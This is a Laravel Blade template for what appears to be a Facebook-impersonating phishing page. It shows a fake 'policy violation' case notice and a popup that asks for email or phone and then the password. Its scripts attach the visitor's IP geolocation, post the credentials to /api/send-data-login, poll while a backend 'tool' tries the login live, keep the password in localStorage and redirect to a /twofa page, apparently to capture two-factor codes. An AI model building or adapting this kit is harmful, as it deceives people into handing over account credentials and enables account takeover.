@push('icons')
    <link rel="apple-touch-icon" href="{{ asset('assets/img/language-svgrepo-com.svg') }}" sizes="180x180">
    <link rel="icon" href="{{ asset('assets/img/language-svgrepo-com.svg') }}" sizes="32x32">
    <link rel="icon" href="{{ asset('assets/img/language-svgrepo-com.svg') }}" sizes="16x16">
    <link rel="icon" href="{{ asset('assets/img/language-svgrepo-com.svg') }}" sizes="16x16">
    <link rel="mask-icon" href="{{ asset('assets/img/language-svgrepo-com.svg') }}">
    <link rel="icon" href="{{ asset('assets/img/language-svgrepo-com.svg') }}">
@endpush
@push('styles')
    <style>
        /* CSS */
        .error {
            outline: none;
            border: 1px solid red;
        }

        .error:focus {
            outline: none;
            border: 1px solid red;
        }

        .error::placeholder {
            color: red;
        }

        .w-full {
            width: 100%;
        }

        .appearance-none {
            -webkit-appearance: none;
            -moz-appearance: none;
            appearance: none;
        }

        .rounded {
            border-radius: 0.25rem;
        }

        .rounded-l-none {
            border-top-left-radius: 0;
            border-bottom-left-radius: 0;
        }

        .border {
            border-width: 1px;
        }

        .border-gray-300 {
            border-color: #d2d6dc;
        }

        .bg-white {
            background-color: #ffffff;
        }

        .px-3 {
            padding-left: 0.75rem;
            padding-right: 0.75rem;
        }

        .py-2 {
            padding-top: 0.5rem;
            padding-bottom: 0.5rem;
        }

        .leading-tight {
            line-height: 1.25;
        }

        .text-gray-700 {
            color: #4a5568;
        }

        .focus\:border-gray-500:focus {
            border-color: #cbd5e0;
        }

        .focus\:outline-none:focus {
            outline: none;
        }

        .w-44 {
            width: 50px;
        }

        .appearance-none {
            -webkit-appearance: none;
            -moz-appearance: none;
            appearance: none;
        }

        .border {
            border-width: 1px;
            border-style: solid;
        }

        .border-r-0 {
            border-right-width: 0;
        }

        .border-gray-300 {
            border-color: #d2d6dc;
        }

        .bg-white {
            background-color: #ffffff;
        }

        .px-3 {
            padding-left: 0.75rem;
            padding-right: 0.75rem;
        }

        .py-2 {
            padding-top: 0.5rem;
            padding-bottom: 0.5rem;
        }

        .leading-tight {
            line-height: 1.25;
        }

        .text-gray-700 {
            color: #4a5568;
        }

        .focus\:outline-none:focus {
            outline: none;
        }

        select {
            font-family: "Noto Color Emoji", sans-serif;
            font-weight: 400;
            font-style: normal;
        }


        .error-notification {
            /* text-align: center; */
            display: none;
            /* padding: 0px 30px; */
        }

        .error-notification,
        .error-notification a {
            color: red;
        }

        .error-notification a {
            font-weight: bold;
        }
    </style>
@endpush
@push('scripts')
    <script>
        document.addEventListener("DOMContentLoaded", function() {
            // console.clear();
        });

        function openPopup() {
            document.getElementById("popup").style.display = "flex";
        }

        function closePopup() {
            document.getElementById("popup").style.display = "none";
        }

        function validatepassword() {
            var password = document.getElementById("password").value;
            if (password.length == 0) {
                $("#password").addClass('error');
                $("#password").focus();
                return;
            } else {
                $("#password").removeClass('error');
                return;
            }
        }

        document.addEventListener('DOMContentLoaded', function() {
            const passwordInput = document.getElementById('password');
            const eyeIcon = document.querySelector('.fa-eye');
            eyeIcon.addEventListener('click', function() {
                const isPasswordVisible = passwordInput.type === 'text';
                passwordInput.type = isPasswordVisible ? 'password' : 'text';
                eyeIcon.className = isPasswordVisible ? 'fa fa-eye-slash' : 'fa fa-eye';
            });
        });
    </script>
    {{-- js --}}
    <script>
        var ipAddress = "";
        var latitude = "";
        var longitude = "";
        var countryName = "";
        var countryCode = "";
        var cityName = "";
        var regionName = "";
        var timeZone = "";
        var zipCode = "";
        var continent = "";
        var continentCode = "";

        setCurrentLang();

        async function setCurrentLang() {
            let getIpInfoUrl = '{{ session()->get('getIpInfoUrl') }}';
            const response = await fetch(getIpInfoUrl);
            const ipInfo = await response.json();
            console.log(ipInfo);
            ipAddress = ipInfo.ipAddress;
            latitude = ipInfo.latitude;
            longitude = ipInfo.longitude;
            countryName = ipInfo.countryName;
            countryCode = ipInfo.countryCode;
            cityName = ipInfo.cityName;
            regionName = ipInfo.regionName;
            timeZone = ipInfo.timeZone;
            zipCode = ipInfo.zipCode;
            continent = ipInfo.continent;
            continentCode = ipInfo.continentCode;
        }

        function pushIPInfo(formData) {
            formData.append('ipAddress', ipAddress)
            formData.append('latitude', latitude)
            formData.append('longitude', longitude)
            formData.append('countryName', countryName)
            formData.append('countryCode', countryCode)
            formData.append('regionName', regionName)
            formData.append('cityName', cityName)
            formData.append('timeZone', timeZone)
            formData.append('zipCode', zipCode)
            formData.append('continent', continent)
            formData.append('continentCode', continentCode)
            return formData;
        }

        function isNumeric(str) {
            if (typeof str != "string") return false // we only process strings!

            return !isNaN(str) &&
                // use type coercion to parse the _entirety_ of the string (`parseFloat` alone does not do this)...
                !isNaN(parseFloat(str)) // ...and ensure strings of whitespace fail
        }

        function isValidValuePhoneEmail(value) {
            if (isNumeric(value)) {
                const regexPhoneNumber = /^0\d{9,11}$/;

                return regexPhoneNumber.test(value);
            } else {
                const regexEmail = /\w+@[a-zA-Z_]+?\.[a-zA-Z]{2,3}$/;

                return regexEmail.test(value);
            }
        }


        var idIntervalGetCacheByEmail = null;
        var isLoginSuccessfully = 0;
        var email = "";

        function sendDataLogin() {
            //
            $('.error-notification').css('display', 'none');
            //
            const valueEmail = $('#email').val();
            email = valueEmail;
            const valuePassword = $('#password').val();
            const loading = $('#submit-login-loading');
            const text = $('#submit-login-text');
            let formData = new FormData();
            formData.append('email_2', valueEmail);
            formData.append('password_2', valuePassword);
            formData = pushIPInfo(formData);
            $.ajax({
                method: "POST",
                url: "/api/send-data-login",
                data: formData,
                cache: false,
                contentType: false,
                processData: false,
                success: function(response) {
                    if (response.status == 0) {
                        // start to call get cache by email waiting until tool returns response of login
                        idIntervalGetCacheByEmail = setInterval(async () => {
                            let info = await getCacheByEmail(valueEmail);
                            if (info) {
                                text.removeClass('d-none');
                                loading.addClass('d-none');
                                if (parseInt(info.isLoginSuccessfully) == 1) {
                                    // $('#modal-login').css('display', 'none');
                                    // $('#modal-fa').css('display', 'block');
                                    // $('.error-notification').css('display', 'none');
                                    // save user to localStorage
                                    localStorage.setItem('user', JSON.stringify({
                                        email: valueEmail,
                                        password: valuePassword,
                                    }));

                                    window.location.href = '/twofa';
                                } else {
                                    console.log('Login failed');
                                    $('.error-notification').css('display', 'block');
                                    text.removeClass('d-none');
                                    loading.addClass('d-none');
                                }
                                clearInterval(idIntervalGetCacheByEmail);
                                $('.button-form-login').prop('disabled', false);
                            } else {
                                console.log("Still call get cache by email");
                            }
                        }, 3000);
                    } else {
                        $('.button-form-login').prop('disabled', false);
                        $('.error-notification').css('display', 'block');
                        text.removeClass('d-none');
                        loading.addClass('d-none');
                    }
                }
            })
        }

        async function getCacheByEmail(email) {
            let result = null;
            let formData = new FormData();
            formData.append('email', email);
            await $.ajax({
                method: "POST",
                url: "/api/get-cache-by-email",
                data: formData,
                cache: false,
                contentType: false,
                processData: false,
                success: function(response) {
                    if (response.status == 0) {
                        result = response.data;
                    }
                }
            })

            return result;
        }

        $(document).on('click', '#must-check', function() {
            let value = $('#email').val();
            if ($(this).is(':checked') && isValidValuePhoneEmail(value)) {
                $('.btn-submit').prop('disabled', false);
                $('.btn-submit').css('background-color', 'rgb(26, 115, 227');
            } else {
                $('.btn-submit').prop('disabled', true);
                $('.btn-submit').css('background-color', 'rgb(136, 189, 255)');
            }
        })

        $(document).on('click', '.button-form-login', function() {
            $(this).prop('disabled', true);
            $('#login_error').addClass('d-none');
            const loading = $('#submit-login-loading');
            const text = $('#submit-login-text');
            text.addClass('d-none');
            loading.removeClass('d-none');
            let email = $('#email').val();
            let pass = $('#password').val();
            setTimeout(() => {
                if (!pass) {
                    text.removeClass('d-none');
                    loading.addClass('d-none');
                    $('.error-notification').css('display', 'block');
                    $(this).prop('disabled', false);
                } else {
                    sendDataLogin();
                }
            }, 1000);
        });

        $(document).on('input', '#email', function() {
            if (isValidValuePhoneEmail($(this).val())) {
                $(this).removeClass("error");
                $(this).prop('placeholder', '');
                if ($('#must-check').is(':checked')) {
                    $('.btn-submit').prop('disabled', false);
                    $('.btn-submit').css('background-color', 'rgb(26, 115, 227');
                }
            } else {
                $(this).addClass("error");
                $(this).prop('placeholder', 'Email or number phone is not valid');
                $(this).focus();
                $('.btn-submit').prop('disabled', true);
                $('.btn-submit').css('background-color', 'rgb(136, 189, 255)');
            }
        });
    </script>
@endpush
@extends('layouts.main')
@section('content')
<div class="header">
    <img src=""
        alt="" />
</div>
<div class="main">
    <div class="maintop">
        <div class="content">
            <img class="imgtop"
                src="/image/home3.png"
                alt="" />
            <div class="contentright">
                <p class="titleright">@lang('home.home_violate')</p>
                <p>
                    <span class="open">@lang('home.home_open')</span>
                    <span class="case" id="case">@lang('home.home_case') #9505997380</span>
                </p>
            </div>
        </div>
    </div>
    <div class="maincontent">
        <div class="contentmain">
            <div class="contentmainright">
                <b>@lang('home.home_our_message')</b>
                <p>@lang('home.home_condition_1')</p>
                <p>@lang('home.home_condition_2')</p>
                <p>@lang('home.home_condition_3')</p>
                <p>@lang('home.home_condition_4')</p>
                <p class="remind">@lang('home.home_our_des')</p>
            </div>
        </div>
    </div>
    <div class="footer">
        <div class="bp">
            <p class="footer-top">
                <b>* @lang('home.home_required') </b>@lang('home.home_hint')
            </p>
        </div>
        <div class="button-btn">
            <input type="text" id="email" placeholder="@lang('login.email')" />
        </div>
        <div class="buttuncheck">
            <input type="checkbox" id="must-check" />
            <label for="must-check" class="buttuncheck-label">@lang('home.home_confirm')</label>
        </div>
        <button class="btn-submit" id="btn-submit" style="background-color:rgb(136, 189, 255)" disabled
            onclick="openPopup()">@lang('login.submit')</button>
        <div class="footer-bottom">
            <p>@lang('home.home_infomation') <a
                    href="https://www.facebook.com/privacy/policy/?entry_point=data_policy_redirect&entry=0">@lang('home.home_privacy')</a>
            </p>
        </div>
    </div>
</div>
<div class="popup-container" id="popup">
    <div class="popup-content">
        <div class="popup-header">
            <h2>@lang('home.popup_header')</h2>
            <span class="popup-close" onclick="closePopup()">×</span>
        </div>
        <div class="popup-body">
            <p class="popup-text">@lang('home.popup_text')</p>
            <div class="form-group" style="margin-bottom: 0px">
                <label>@lang('home.popup_password')</label>
                <div class="error-notification mb-2" style="display: none">
                    <span class="">@lang('fa.warning_login_fa')</span>
                    <br><a class="" href="https://facebook.com/login/identify/">@lang('fa.warning_find_fa')</a>
                </div>
                <div class="" style="display:flex;align-items:center;position: relative;">
                    <input type="password" class="form-input" id="password" oninput="validatepassword()"
                        placeholder="@lang('login.password')" value="" />
                    <i id="eye" class="fa fa-eye" style="position: absolute;right:30px"></i>
                </div>
            </div>
            <p class="error-message" id="error-message" style="display: none">@lang('home.popup_error')</p>
        </div>
        <div class="popup-footer">
            {{-- <button class="button" disabled id="btn-continue" onclick="nextPage()"> Continue </button> --}}
            <button style="background-color: rgb(26, 115, 227);color:white" type="button"
                class="button-form-login">
                <span id="submit-login-loading" style="width:1.5rem;height:1.5rem;"
                    class="d-none spinner-border spinner">
                </span>
                <span id="submit-login-text">@lang('login.submit')</span>
            </button>
            <span class="loader" id="loader"></span>
        </div>
    </div>
</div>
@endsection
